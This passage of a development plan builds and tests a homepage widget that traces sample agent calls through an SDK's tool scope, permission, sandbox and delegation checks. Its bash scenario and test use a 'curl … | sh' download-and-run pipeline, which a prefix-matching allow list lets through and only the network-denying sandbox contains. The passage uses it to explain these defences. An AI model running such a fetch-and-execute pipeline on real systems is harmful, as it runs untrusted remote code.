      { gate: "delegation", state: "skipped", note: onlyTask },
    ],
    result: "readFile runs inside the sandbox.",
  },
  {
    id: "refund",
    scenario: "refund",
    steps: [
      { gate: "scope", state: "passed", note: "refund is one of this route's own tools." },
      { gate: "permission", state: "waiting", note: "approve names refund, so a person decides." },
      { gate: "sandbox", state: "unreached", note: "Nothing runs until someone answers." },
      { gate: "delegation", state: "unreached", note: "Nothing runs until someone answers." },
    ],
    result: "The run pauses for approval. Allow it once, or deny it.",
  },
  {
    id: "refund-once",
    scenario: "refund",
    steps: [
      { gate: "scope", state: "passed", note: "refund is one of this route's own tools." },
      { gate: "permission", state: "passed", note: "Allowed once. Nothing is saved." },
      {
        gate: "sandbox",
        state: "skipped",
        note: "refund is your own code, so it runs in the app process. The sandbox covers the five workspace tools.",
      },
      { gate: "delegation", state: "skipped", note: onlyTask },
    ],
    result: "refund runs. The next refund asks again.",
  },
  {
    id: "refund-deny",
    scenario: "refund",
    steps: [
      { gate: "scope", state: "passed", note: "refund is one of this route's own tools." },
      { gate: "permission", state: "stopped", note: "Denied. Nothing is saved." },
      { gate: "sandbox", state: "unreached", note: "The call never runs." },
      { gate: "delegation", state: "unreached", note: "The call never runs." },
    ],
    result: "refund doesn't run. The model gets the reason as the tool result and can adapt.",
  },
  {
    id: "bash",
    scenario: "bash",
    steps: [
      { gate: "scope", state: "passed", note: "runBash comes with the workspace." },
      {
        gate: "permission",
        state: "passed",
        note: "The allow list has curl, and bash patterns match by prefix, so the whole pipeline passes.",
      },
      {
        gate: "sandbox",
        state: "contained",
        note: 'Network mode "deny": Docker starts the sandbox with --network none.',
      },
      { gate: "delegation", state: "skipped", note: onlyTask },
    ],
    result: "The command runs with no network, so the download fails.",
  },
  {
    id: "delete",
    scenario: "delete",
    steps: [
      {
        gate: "scope",
        state: "stopped",
        note: "deny removes deleteUser, so the model never sees it.",
      },
      { gate: "permission", state: "unreached", note: "There is no call to check." },
      { gate: "sandbox", state: "unreached", note: "There is no call to check." },
      { gate: "delegation", state: "unreached", note: "There is no call to check." },
    ],
    result: "The model can't call deleteUser from this route.",
  },
  {
    id: "delegate",
    scenario: "delegate",
    steps: [
      {
        gate: "scope",
        state: "skipped",
        note: "task is internal, so tool scope doesn't apply to it.",
      },
      { gate: "permission", state: "skipped", note: "No approval rule covers this dispatch." },
      { gate: "sandbox", state: "skipped", note: "Nothing has run yet." },
      {
        gate: "delegation",
        state: "stopped",
        note: "The input is 9,000 characters, so the rule returns its reason.",
      },
    ],
    result:
      'task returns "[B4_E3002] Send the translator one reply at a time." translator never starts.',
  },
]

/** The 0-based lines of `text` that contain any of `why`. */
export function linesContaining(text: string, why: readonly string[]): readonly number[] {
  return text
    .trimEnd()
    .split("\n")
    .flatMap((line, index) => (why.some((part) => line.includes(part)) ? [index] : []))
}

export const boardFor = (scenario: ScenarioId, decision: Decision | null): BoardId =>
  scenario === "refund" && decision !== null ? `refund-${decision}` : scenario

/** What the live region says for a board: the checks that acted, then the result. */
export function describeBoard(board: GateBoard): string {
  const scenario = gateScenarios.find((candidate) => candidate.id === board.scenario)
  const acted = board.steps
    .filter((step) => step.state !== "skipped" && step.state !== "unreached")
    .map((step) => {
      const gate = GATES.find((candidate) => candidate.id === step.gate)
      return `${gate?.label ?? step.gate} ${STATE_LABEL[step.state]}`
    })
  return `${scenario?.call ?? board.scenario}: ${acted.join(", ")}. ${board.result}`
}
```

Generate `gates/gate-sources.json`:

```bash
node -e '
const fs = require("node:fs")
const dir = "apps/web/app/components/homepage/gates/"
const out = { route: fs.readFileSync(dir + "fixtures/src/app/support/index.ts", "utf8"), config: fs.readFileSync(dir + "fixtures/b4.config.ts", "utf8") }
fs.writeFileSync(dir + "gate-sources.json", JSON.stringify(out, null, 2) + "\n")
'
```

Expected content:

```json
{
  "route": "import { agent, type DelegationConstraintPredicate } from \"@b4run/sdk\"\nimport translator from \"./subagents/translator/index.js\"\n\n// The translator gets one reply at a time, never a whole thread.\nconst oneReply: DelegationConstraintPredicate = ({ input }) =>\n  input.length <= 2_000 || \"Send the translator one reply at a time.\"\n\nexport default agent({\n  model: \"gpt-5-mini\",\n  systemPrompt: \"You answer support questions. Refund an order only when the policy allows it.\",\n  tools: {\n    approve: [\"refund\"],\n    deny: [\"deleteUser\"],\n  },\n  subagents: { translator },\n  delegation: {\n    rules: { translator: { action: \"constrain\", predicate: oneReply } },\n  },\n})\n",
  "config": "import { config } from \"@b4run/cli\"\nimport { dockerSandbox } from \"@b4run/sandbox\"\n\nexport default config({\n  permissions: {\n    allow: { bash: [\"curl\"] },\n  },\n  sandbox: {\n    provider: dockerSandbox({ scope: \"my-agent\", image: \"node:24-slim\" }),\n    network: { mode: \"deny\" },\n  },\n})\n"
}
```

`gates/gate-sources.ts`:

```ts
import type { ConfigFileId } from "./gate-scenarios"
import sources from "./gate-sources.json"

/** The two fixture files the tracer shows; gate-scenarios.test.ts pins each to disk. */
export const gateSources: Readonly<Record<ConfigFileId, string>> = sources
```

- [ ] **Step 5: Run the test to verify it passes**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/gates/gate-scenarios.test.ts`
Expected: PASS (10 tests).

Run: `pnpm --dir apps/web typecheck`
Expected: exit 0. That covers the fixtures and the `Decision` type against `PermissionDecision`.

- [ ] **Step 6: Mutation check: the sandbox test binds to the fixture**

```bash
sed -i '' 's/network: { mode: "deny" }/network: { mode: "allow" }/' apps/web/app/components/homepage/gates/fixtures/b4.config.ts
pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/gates/gate-scenarios.test.ts
# expected: 2 failed: "shows each fixture exactly as it is on disk" and "sandbox: this config closes egress…"
sed -i '' 's/network: { mode: "allow" }/network: { mode: "deny" }/' apps/web/app/components/homepage/gates/fixtures/b4.config.ts
pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/gates/gate-scenarios.test.ts
# expected: 10 passed
```

- [ ] **Step 7: Commit**

```bash
git status --short
git add apps/web/app/components/homepage/gates/fixtures apps/web/app/components/homepage/gates/gate-scenarios.ts apps/web/app/components/homepage/gates/gate-sources.json apps/web/app/components/homepage/gates/gate-sources.ts apps/web/app/components/homepage/gates/gate-scenarios.test.ts
git commit -m "feat(web): guardrail scenarios checked against B4's own scope, permission, sandbox and delegation code

Co-Authored-By: Claude Opus 5.5 <noreply@anthropic.com>"
```

---

### Task 5: The GateTracer island and the Guardrails shell

**Files:**
- Create: `gates/prepare.ts`, `gates/GateTracer.tsx`, `gates/gates.module.css`, `gates/Guardrails.tsx`
- Test: `gates/GateTracer.test.tsx`

**Behaviour the tests pin** (the UI/UX Pro Max lessons from PR 1's review):

- **Every state change updates everything at once.** The click handler sets the board, the radio, the marked config lines and the live text in the same handler. The timeline only animates.
- **Rapid picks.** Each pick kills the previous timeline and clears its inline styles.
- **One announcement per action, none on mount.**
- **Focus.**
  - Clicking **refund** moves focus to **Allow once**. Arrowing onto it doesn't (Risk 5).
  - A decision moves focus to **Ask again**, and **Ask again** returns focus to **Allow once**.
- **Inert variants.** Every board, file and caption that isn't showing is `aria-hidden` and `inert`.
- **Reduced motion.** Nothing tweens, and no inline styles are left.

- [ ] **Step 1: Write the failing test**

Create `apps/web/app/components/homepage/gates/GateTracer.test.tsx`:

```tsx
// @vitest-environment jsdom
import { act } from "react"
import { createRoot, type Root } from "react-dom/client"
import { renderToString } from "react-dom/server"
import { afterEach, expect, it } from "vitest"
import { FULL, gsap, REDUCE } from "../motion/gsap"
import { type MediaStub, stubMatchMedia } from "../motion/media-stub"
import { GateTracer } from "./GateTracer"
import { Guardrails } from "./Guardrails"
import { describeBoard, gateBoards } from "./gate-scenarios"
import { prepareGates } from "./prepare"

;(globalThis as { IS_REACT_ACT_ENVIRONMENT?: boolean }).IS_REACT_ACT_ENVIRONMENT = true
let root: Root | undefined
let media: MediaStub | undefined
afterEach(async () => {
  await act(async () => root?.unmount())
  root = undefined
  media?.restore()
  media = undefined
})

const data = await prepareGates()
const say = (id: string) => {
  const board = gateBoards.find((candidate) => candidate.id === id)
  if (!board) throw new Error(`No board ${id}`)
  return describeBoard(board)
}

async function mount(reduce: boolean) {
  media = stubMatchMedia({ [REDUCE]: reduce, [FULL]: !reduce })
  const container = document.createElement("div")
  document.body.replaceChildren(container)
  root = createRoot(container)
  await act(async () => root?.render(<GateTracer {...data} />))
  const radio = (id: string) => {
    const match = container.querySelector<HTMLInputElement>(`input[type="radio"][value="${id}"]`)
    if (!match) throw new Error(`No radio for ${id}`)
    return match
  }
  const activeBoard = () => container.querySelector('[data-board][data-active="true"]')
  const button = (selector: string) => {
    const match = activeBoard()?.querySelector<HTMLButtonElement>(selector)
    if (!match) throw new Error(`No ${selector} on the active board`)
    return match
  }
  return {
    container,
    radio,
    pick: (id: string) => act(async () => radio(id).click()),
    // What a browser does for an arrow key in a radio group: keydown on the
    // focused radio, then focus and check the next one, then keyup there.
    arrowTo: (id: string) =>
      act(async () => {
        const from = document.activeElement ?? container
        from.dispatchEvent(new KeyboardEvent("keydown", { key: "ArrowRight", bubbles: true }))
        radio(id).focus()
        radio(id).click()
        radio(id).dispatchEvent(new KeyboardEvent("keyup", { key: "ArrowRight", bubbles: true }))
      }),
    press: (selector: string) => act(async () => button(selector).click()),
    board: () => activeBoard()?.getAttribute("data-board"),
    states: () =>
      [...(activeBoard()?.querySelectorAll("[data-gate]") ?? [])].map(
        (gate) => `${gate.getAttribute("data-gate")}:${gate.getAttribute("data-state")}`,
      ),
    file: () =>
      container.querySelector('[data-file][data-active="true"]')?.getAttribute("data-file"),
    marked: () =>
      [...container.querySelectorAll('[data-file][data-active="true"] [data-why="true"]')].map(
        (line) => (line.textContent ?? "").replace(/^›/, "").trim(),
      ),
    hiddenAreInert: () =>
      [
        ...container.querySelectorAll(
          '[data-board]:not([data-active="true"]), [data-file]:not([data-active="true"]), [data-scenario]:not([data-active="true"])',
        ),
      ].every((node) => node.getAttribute("aria-hidden") === "true" && node.hasAttribute("inert")),
    live: () => container.querySelector('[aria-live="polite"]')?.textContent,
    focused: () => document.activeElement?.textContent,
    moving: () =>
      [...container.querySelectorAll("[data-gate], [data-result]")].flatMap((node) =>
        gsap.getTweensOf(node).filter((tween) => tween.duration() > 0),
      ),
    styled: () =>
      [...container.querySelectorAll<HTMLElement>("[data-gate], [data-result]")].filter(
        (node) => node.style.opacity !== "" || node.style.transform !== "",
      ).length,
  }
}

it("renders the section on the server with the first call traced and nothing announced", () => {
  const container = document.createElement("div")
  container.innerHTML = renderToString(<Guardrails {...data} />)
  const section = container.querySelector("section#guardrails")
  expect(section?.getAttribute("aria-labelledby")).toBe("guardrails-title")
  expect(section?.querySelector("h2")?.textContent).toBe("Four checks decide what a call can do.")
  expect(section?.querySelector("fieldset legend")?.textContent).toBe(
    "Pick a call the support agent makes",
  )
  const radios = [...container.querySelectorAll<HTMLInputElement>('input[type="radio"]')]
  expect(radios.map((radio) => [radio.value, radio.checked])).toEqual([
    ["read", true],
    ["refund", false],
    ["bash", false],
    ["delete", false],
    ["delegate", false],
  ])
  // Every board is in the page; only the first shows.
  expect([...container.querySelectorAll("[data-board]")]).toHaveLength(gateBoards.length)
  const shown = container.querySelector('[data-board][data-active="true"]')
  expect(shown?.getAttribute("data-board")).toBe("read")
  expect(shown?.textContent).toContain("1 · Tool scope")
  expect(shown?.textContent).toContain("passed")
  expect(shown?.textContent).toContain("readFile runs inside the sandbox.")
  expect(container.querySelector("[style]")).toBeNull()
  expect(container.querySelector('[aria-live="polite"]')?.textContent).toBe("")
  expect(section?.querySelector('a[href="/docs/access-control#how-they-compose"]')).not.toBeNull()
})

it("traces a call at once: states, config, marks and one announcement", async () => {
  const view = await mount(true)
  expect(view.board()).toBe("read")
  expect(view.live()).toBe("")
  expect(view.hiddenAreInert()).toBe(true)

  await view.pick("bash")
  expect(view.board()).toBe("bash")
  expect(view.states()).toEqual([
    "scope:passed",
    "permission:passed",
    "sandbox:contained",
    "delegation:skipped",
  ])
  expect(view.file()).toBe("config")
  expect(view.marked()).toEqual(['allow: { bash: ["curl"] },', 'network: { mode: "deny" },'])
  expect(view.live()).toBe(say("bash"))
  expect(view.live()).toBe(
    'runBash("curl … | sh"): Tool scope passed, Permission passed, Sandbox contained. The command runs with no network, so the download fails.',
  )
  expect(view.hiddenAreInert()).toBe(true)

  await view.pick("delete")
  expect(view.states()).toEqual([
    "scope:stopped",
    "permission:unreached",
    "sandbox:unreached",
    "delegation:unreached",
  ])
  expect(view.file()).toBe("route")
  expect(view.marked()).toEqual(['deny: ["deleteUser"],'])
  expect(view.live()).toBe(say("delete"))
  // Reduced motion: final state, nothing moving, no inline styles left.
  expect(view.moving()).toEqual([])
  expect(view.styled()).toBe(0)
})

it("pauses refund for a person, moves focus to the answer, and announces the outcome", async () => {
  const view = await mount(true)
  await view.pick("refund")
  expect(view.board()).toBe("refund")
  expect(view.states()).toEqual([
    "scope:passed",
    "permission:waiting",
    "sandbox:unreached",
    "delegation:unreached",
  ])
  expect(view.focused()).toBe("Allow once")
  expect(view.live()).toBe(say("refund"))

  await view.press('[data-decision="once"]')
  expect(view.board()).toBe("refund-once")
  expect(view.states()).toEqual([
    "scope:passed",
    "permission:passed",
    "sandbox:skipped",
    "delegation:skipped",
  ])
  expect(view.live()).toBe(say("refund-once"))
  expect(view.focused()).toBe("Ask again")
  // The radio still says refund: the decision is part of the same call.
  expect(view.radio("refund").checked).toBe(true)

  await view.press('[data-action="again"]')
  expect(view.board()).toBe("refund")
  expect(view.focused()).toBe("Allow once")
  await view.press('[data-decision="deny"]')
  expect(view.board()).toBe("refund-deny")
  expect(view.states()[1]).toBe("permission:stopped")
  expect(view.live()).toBe(say("refund-deny"))
  expect(view.focused()).toBe("Ask again")
})

it("leaves focus in the radio group when the visitor arrows onto refund", async () => {
  const view = await mount(true)
  view.radio("read").focus()
  await view.arrowTo("refund")
  expect(view.board()).toBe("refund")
  expect(view.live()).toBe(say("refund"))
  expect(document.activeElement).toBe(view.radio("refund"))
})

it("with motion on, a second quick pick kills the first trace and the state is already final", async () => {
  const view = await mount(false)
  await view.pick("bash")
  expect(view.moving().length).toBeGreaterThan(0)
  await view.pick("delegate")
  await view.pick("delete")
  // Final semantic state straight away, from one announcement per pick.
  expect(view.board()).toBe("delete")
  expect(view.live()).toBe(say("delete"))
  // Only the delete board is moving; the killed traces left no inline styles.
  const bash = [...view.container.querySelectorAll('[data-board="bash"] [data-gate]')]
  expect(bash.flatMap((node) => gsap.getTweensOf(node))).toEqual([])
  expect(bash.every((node) => (node as HTMLElement).style.opacity === "")).toBe(true)
  const deleteGates = [...view.container.querySelectorAll('[data-board="delete"] [data-gate]')]
  expect(deleteGates.flatMap((node) => gsap.getTweensOf(node)).length).toBe(4)
})
```

- [ ] **Step 2: Run it to verify it fails**

Run: `pnpm --dir apps/web exec vitest --run --config vitest.config.ts app/components/homepage/gates/GateTracer.test.tsx`
Expected: FAIL; `./GateTracer`, `./Guardrails` and `./prepare` can't be resolved.

- [ ] **Step 3: Write the server-only preparation**

`gates/prepare.ts`:

```ts
import "server-only"
import { highlightCode } from "../highlight"
import {
  CONFIG_FILES,
  type ConfigFileId,
  gateScenarios,
  linesContaining,
  type ScenarioId,
} from "./gate-scenarios"
import { gateSources } from "./gate-sources"

/** One fixture file, highlighted: one HTML string per line. */
export interface GateConfigFile {
  readonly path: string
  readonly lines: readonly string[]
}

export interface GatesData {
  readonly files: Readonly<Record<ConfigFileId, GateConfigFile>>
  /** For each scenario, the 0-based lines of its file that explain the result. */
  readonly whyLines: Readonly<Record<ScenarioId, readonly number[]>>
}

/** Everything the tracer renders, highlighted on the server. */
export async function prepareGates(): Promise<GatesData> {
  const ids = Object.keys(CONFIG_FILES) as ConfigFileId[]
  const highlighted = await Promise.all(
    ids.map(async (id) => {
      const { path } = CONFIG_FILES[id]
      const code = await highlightCode(gateSources[id], "typescript", path, "")
      return [id, { path, lines: code.lines }] as const
    }),
  )
  const whyLines = Object.fromEntries(
    gateScenarios.map((scenario) => [
      scenario.id,
      linesContaining(gateSources[scenario.file], scenario.why),
    ]),
  ) as Record<ScenarioId, readonly number[]>
  return {
    files: Object.fromEntries(highlighted) as Record<ConfigFileId, GateConfigFile>,
    whyLines,
  }
}
```

- [ ] **Step 4: Write the island**

`gates/GateTracer.tsx`:

```tsx
"use client"
import { type KeyboardEvent, useEffect, useId, useLayoutEffect, useRef, useState } from "react"
import { gsap, withMotion } from "../motion/gsap"
import {
  boardFor,
  type ConfigFileId,
  type Decision,
  describeBoard,
  GATES,
  gateBoards,
  gateScenarios,
  type ScenarioId,
  STATE_GLYPH,
  STATE_LABEL,
} from "./gate-scenarios"
import styles from "./gates.module.css"
import type { GatesData } from "./prepare"

/** Where focus goes once React has committed a change. */
type FocusTarget = "decision" | "again" | null

interface Trace {
  readonly timeline: ReturnType<typeof gsap.timeline>
  readonly targets: readonly Element[]
}

/** Stops a running trace and drops the inline styles it left behind. */
function stopTrace(trace: { current: Trace | null }) {
  const running = trace.current
  trace.current = null
  if (!running) return
  running.timeline.kill()
  gsap.set(running.targets, { clearProps: "opacity,transform" })
}

const FILE_IDS: readonly ConfigFileId[] = ["route", "config"]

/**
 * The four-gate call tracer. Picking a call sets every label, attribute and
 * the announcement at once; the GSAP timeline only walks the eye across the
 * gates, and the next pick kills it. Every board and file stays mounted in one
 * grid cell, so nothing moves the page.
 */
export function GateTracer({ files, whyLines }: GatesData) {
  const name = useId()
  const rootRef = useRef<HTMLDivElement>(null)
  const motionRef = useRef(false)
  const traceRef = useRef<Trace | null>(null)
  // Arrow keys move through a radio group and check as they go; they must not
  // pull focus out of the group. Only a click, or Space, moves focus on.
  const arrowRef = useRef(false)
  const [scenario, setScenario] = useState<ScenarioId>("read")
  const [decision, setDecision] = useState<Decision | null>(null)
  const [runs, setRuns] = useState(0)
  const [focusTarget, setFocusTarget] = useState<FocusTarget>(null)
  const [announcement, setAnnouncement] = useState("")
  const active = boardFor(scenario, decision)
  const file = gateScenarios.find((candidate) => candidate.id === scenario)?.file ?? "route"

  useEffect(() => {
    const root = rootRef.current
    if (!root) return
    const stop = withMotion(root, {
      reduce: () => {
        motionRef.current = false
        stopTrace(traceRef)
        return undefined
      },
      full: () => {
        motionRef.current = true
        return () => {
          motionRef.current = false
        }
      },
    })
    return () => {
      stop()
      stopTrace(traceRef)
    }
  }, [])

  // Walk the new board's gates, 180ms each. The board is already final.
  useLayoutEffect(() => {
    if (runs === 0) return
    stopTrace(traceRef)
    if (!motionRef.current) return
    const board = rootRef.current?.querySelector(`[data-board="${active}"]`)
    if (!board) return
    const gates = [...board.querySelectorAll("[data-gate]")]
    const result = [...board.querySelectorAll("[data-result]")]
    const timeline = gsap.timeline()
    for (const gate of gates) {
      timeline.fromTo(
        gate,
        { opacity: 0.25, y: 6 },
        { opacity: 1, y: 0, duration: 0.18, ease: "power2.out" },
      )
    }
    timeline.fromTo(result, { opacity: 0 }, { opacity: 1, duration: 0.18 })
    const trace: Trace = { timeline, targets: [...gates, ...result] }
    timeline.eventCallback("onComplete", () => {
      if (traceRef.current === trace) stopTrace(traceRef)
    })
    traceRef.current = trace
  }, [runs, active])

  // Focus moves only after React commits, when the target is no longer inert.
  useEffect(() => {
    if (focusTarget === null) return
    const selector =
      focusTarget === "decision"
        ? '[data-board="refund"] [data-decision="once"]'
        : `[data-board="${active}"] [data-action="again"]`
    rootRef.current?.querySelector<HTMLButtonElement>(selector)?.focus()
    setFocusTarget(null)
  }, [focusTarget, active])

  function show(next: ScenarioId, answer: Decision | null, focus: FocusTarget) {
    const board = gateBoards.find((candidate) => candidate.id === boardFor(next, answer))
    setScenario(next)
    setDecision(answer)
    setRuns((count) => count + 1)
    setFocusTarget(focus)
    if (board) setAnnouncement(describeBoard(board))
  }

  function pick(next: ScenarioId) {
    const viaArrow = arrowRef.current
    arrowRef.current = false
    show(next, null, next === "refund" && !viaArrow ? "decision" : null)
  }

  function trackArrows(event: KeyboardEvent) {
    arrowRef.current = event.type === "keydown" && event.key.startsWith("Arrow")
  }

  return (
    <div ref={rootRef} className={styles.tracer}>
      <fieldset className={styles.calls} onKeyDown={trackArrows} onKeyUp={trackArrows}>
        <legend className={styles.legend}>Pick a call the support agent makes</legend>
        <div className={styles.callList}>
          {gateScenarios.map((candidate) => (
            <label key={candidate.id} className={styles.call}>
              <input
                type="radio"
                name={name}
                value={candidate.id}
                checked={candidate.id === scenario}
                onChange={() => pick(candidate.id)}
              />
              <code>{candidate.call}</code>
            </label>
          ))}
        </div>
      </fieldset>
      <div className={styles.stage}>
        {gateBoards.map((board) => {
          const on = board.id === active
          const call = gateScenarios.find((candidate) => candidate.id === board.scenario)?.call
          return (
            <div
              key={board.id}
              className={styles.board}
              data-board={board.id}
              data-active={on}
              aria-hidden={on ? undefined : true}
              inert={on ? undefined : true}
            >
              <ol className={styles.gates} aria-label={`The four checks for ${call}`}>
                {board.steps.map((step, index) => (
                  <li
                    key={step.gate}
                    className={styles.gate}
                    data-gate={step.gate}
                    data-state={step.state}
                  >
                    <span className={styles.gateName}>
                      {index + 1} · {GATES[index]?.label}
                    </span>
                    <span className={styles.gateState}>
                      <span aria-hidden="true">{STATE_GLYPH[step.state]}</span>{" "}
                      {STATE_LABEL[step.state]}
                    </span>
                    <span className={styles.gateNote}>{step.note}</span>
                  </li>
                ))}
              </ol>
              <p className={styles.result} data-result="">
                {board.result}
              </p>
              {board.id === "refund" && (
                <div className={styles.actions}>
                  <button
                    type="button"
                    data-decision="once"
                    onClick={() => show("refund", "once", "again")}
                  >
                    Allow once
                  </button>
                  <button
                    type="button"
                    data-decision="deny"
                    onClick={() => show("refund", "deny", "again")}
                  >
                    Deny
                  </button>
                </div>
              )}
              {board.scenario === "refund" && board.id !== "refund" && (
                <div className={styles.actions}>
                  <button
                    type="button"
                    data-action="again"
                    onClick={() => show("refund", null, "decision")}
                  >
                    Ask again
                  </button>
                </div>
              )}
            </div>
          )
        })}
      </div>
      <div className={styles.panel}>
        <div className={styles.stage}>
          {FILE_IDS.map((id) => {
            const on = id === file
            return (
              <div
                key={id}
                data-file={id}
                data-active={on}
                aria-hidden={on ? undefined : true}
                inert={on ? undefined : true}
              >
                <p className={styles.path}>{files[id].path}</p>
                <pre className={styles.code}>
                  <code>
                    {files[id].lines.map((html, index) => {
                      const lineKey = `${id}:${index}`
                      const why = on && whyLines[scenario].includes(index)
                      return (
                        <span key={lineKey} className={styles.line} data-why={why}>
                          <span className={styles.gutter} aria-hidden="true">
                            {why ? "›" : " "}
                          </span>
                          {/* biome-ignore lint/security/noDangerouslySetInnerHtml: Only server-produced Shiki tokens; highlightCode escapes all source text. */}
                          <span dangerouslySetInnerHTML={{ __html: html }} />
                        </span>
                      )
                    })}
                  </code>
                </pre>
              </div>
            )
          })}
        </div>
        <div className={styles.stage}>
          {gateScenarios.map((candidate) => {
            const on = candidate.id === scenario
            return (
              <p
                key={candidate.id}
                className={styles.explain}
                data-scenario={candidate.id}
                data-active={on}
                aria-hidden={on ? undefined : true}
                inert={on ? undefined : true}
              >
                <span>{candidate.explain}</span>
                <a href={candidate.docsHref}>{candidate.docsLabel} →</a>
              </p>
            )
          })}
        </div>
      </div>
      <p className="sr-only" aria-live="polite">
        {announcement}
      </p>
    </div>
  )
}
```

- [ ] **Step 5: Write the shell and the styles**

`gates/Guardrails.tsx`:

```tsx
import { Eyebrow } from "../../ui/Eyebrow"
import { GateTracer } from "./GateTracer"
import { GUARDRAILS_LINK } from "./gate-scenarios"
import styles from "./gates.module.css"
import type { GatesData } from "./prepare"

/**
 * "Guardrails": the four checks between the model and your system. The tracer
 * is the island; the server renders it with the first call traced and every
 * other board in the DOM.
 */
export function Guardrails(data: GatesData) {
  return (
    <section id="guardrails" className={styles.section} aria-labelledby="guardrails-title">
      <div className={styles.intro}>
        <Eyebrow className={styles.eyebrow}>Guardrails</Eyebrow>
        <h2 id="guardrails-title">Four checks decide what a call can do.</h2>
        <p>
          Tool scope, permissions, the sandbox and delegation each answer one question. Pick a call
          this support agent might make and see which checks it meets.
        </p>
      </div>
      <GateTracer {...data} />
      <p className={styles.links}>
        <a href={GUARDRAILS_LINK.href}>{GUARDRAILS_LINK.label} →</a>
      </p>
    </section>
  )
}
```

`gates/gates.module.css`:
- **Status pills** use the token pairs `ok`/`ok-tint` (5.2:1), `warn`/`warn-tint` (5.8:1) and `danger`/`danger-tint` (6.0:1). Task 4's test checks them.
- **Marked config lines** use the 14% relay-tint mix, also checked in Task 4.
- **Each code line is a two-column grid**, so a line that wraps at 375px stays right of the `›` gutter.

```css
/* "Guardrails" (#guardrails): the four-gate call tracer. Paper Relay tokens
   only (tokens.css). */
.section {
  padding: 56px 0;
  border-bottom: 1px solid var(--color-rule);
}
.intro {
  max-width: 640px;
  margin-bottom: 32px;
}
.eyebrow {
  margin: 0;
}
.intro h2 {
  font-size: clamp(30px, 3.5vw, 43px);
  font-weight: 500;
  line-height: 1.08;
  letter-spacing: -0.045em;
  margin: 24px 0 16px;
}
.intro p:not([data-ui="eyebrow"]) {
  font-size: 15px;
  line-height: 1.8;
  color: var(--color-ink-muted);
  margin: 0;
}

.tracer {
  container-type: inline-size;
}

/* The calls: native radios, one 44px cell each, wrapping on narrow screens. */
.calls {
  min-inline-size: 0;
  margin: 0 0 16px;
  padding: 0;
  border: 0;
}
.legend {
  margin-bottom: 8px;
  padding: 0;
  font:
    12px / 1.6 var(--font-mono),
    monospace;
  color: var(--color-ink-muted);
}
.callList {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}
.call {
  display: inline-flex;
  align-items: center;
  gap: 8px;
  min-height: 44px;
  max-width: 100%;
  padding: 0 12px;
  border: 1px solid var(--color-rule-strong);
  font:
    12px / 1.4 var(--font-mono),
    monospace;
  color: var(--color-ink);
  cursor: pointer;
}
.call code {
  font: inherit;
  overflow-wrap: anywhere;
}
.call input {
  flex: none;
  margin: 0;
  accent-color: var(--color-ink);
}
/* The chosen call: tint and an ink border as well as the filled radio. */
.call:has(input:checked) {
  border-color: var(--color-ink);
  background: var(--color-relay-tint);
}

/* Every board (and file, and caption) sits in the same grid cell: the tallest
   sets the height, so picking a call never shifts the page. */
.stage {
  display: grid;
}
.stage > * {
  grid-area: 1 / 1;
  min-width: 0;
}
.stage > :not([data-active="true"]) {
  visibility: hidden;
}

.board {
  display: grid;
  align-content: start;
  gap: 12px;
}
.gates {
  display: grid;
  grid-template-columns: minmax(0, 1fr);
  gap: 8px;
  margin: 0;
  padding: 0;
  list-style: none;
}
.gate {
  display: grid;
  align-content: start;
  gap: 6px;
  padding: 12px;
  border: 1px solid var(--color-rule-strong);
  background: var(--color-page);
}
/* A check that didn't act is drawn dashed, not only in a quieter colour. */
.gate[data-state="skipped"],
.gate[data-state="unreached"] {
  border-style: dashed;
}
.gateName {
  font:
    12px / 1.5 var(--font-mono),
    monospace;
  color: var(--color-ink-muted);
}
.gateState {
  justify-self: start;
  padding: 2px 8px;
  font:
    500 13px / 1.5 var(--font-mono),
    monospace;
  color: var(--color-ink-muted);
}
.gate[data-state="passed"] .gateState,
.gate[data-state="contained"] .gateState {
  background: var(--color-ok-tint);
  color: var(--color-ok);
}
.gate[data-state="waiting"] .gateState {
  background: var(--color-warn-tint);
  color: var(--color-warn);
}
.gate[data-state="stopped"] .gateState {
  background: var(--color-danger-tint);
  color: var(--color-danger);
}
.gateNote {
  font-size: 13px;
  line-height: 1.55;
  color: var(--color-ink-muted);
}
.result {
  margin: 0;
  font-size: 15px;
  line-height: 1.6;
  color: var(--color-ink);
}
.actions {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}
.actions button {
  min-height: 44px;
  padding: 0 16px;
  border: 1px solid var(--color-ink);
  background: var(--color-page);
  color: var(--color-ink);
  font: 500 14px / 1.4 var(--font-sans);
  cursor: pointer;
}
.actions button:hover {
  background: var(--color-surface);
}

/* The config: the file that explains the current call, with those lines marked. */
.panel {
  margin-top: 16px;
  background: var(--color-panel);
  color: var(--color-panel-ink);
  /* The global focus ring is tuned for paper; on the panel it uses the accent. */
  --color-focus: var(--color-panel-accent);
}
.path {
  margin: 0;
  padding: 12px 16px;
  border-bottom: 1px solid var(--color-panel-rule);
  background: var(--color-panel-strip);
  font:
    12px / 1.6 var(--font-mono),
    monospace;
  color: var(--color-panel-muted);
}
.code {
  margin: 0;
  padding: 12px 16px 12px 0;
  font:
    12px / 1.7 var(--font-mono),
    monospace;
  white-space: pre-wrap;
  overflow-wrap: anywhere;
  tab-size: 2;
}
.code code {
  font: inherit;
}
/* Gutter and code in two columns, so a wrapped line stays right of the gutter. */
.line {
  display: grid;
  grid-template-columns: 3ch minmax(0, 1fr);
  min-height: 1lh;
}
.gutter {
  text-align: center;
  color: var(--color-panel-accent);
}
/* A marked line: a faint tint (every code colour stays at 4.5:1 or more on it,
   see gate-scenarios.test.ts) and the › in the gutter. */
.line[data-why="true"] {
  background-color: color-mix(in srgb, var(--color-relay-tint) 14%, var(--color-panel));
}
.explain {
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 0 12px;
  margin: 0;
  padding: 8px 16px;
  border-top: 1px solid var(--color-panel-rule);
  font-size: 14px;
  line-height: 1.6;
  color: var(--color-panel-muted);
}
.explain a {
  display: inline-flex;
  align-items: center;
  min-height: 44px;
  color: var(--color-panel-ink);
  text-underline-offset: 5px;
}
.links {
  margin: 16px 0 0;
}
.links a {
  display: inline-flex;
  align-items: center;
  min-height: 44px;
  font-size: 14px;
  text-underline-offset: 5px;
}

@container (min-width: 560px) {
  .gates {
    grid-template-columns: repeat(2, minmax(0, 1fr));
  }
}
@container (min-width: 900px) {
  .gates {
    grid-template-columns: repeat(4, minmax(0, 1fr));
  }
}
```

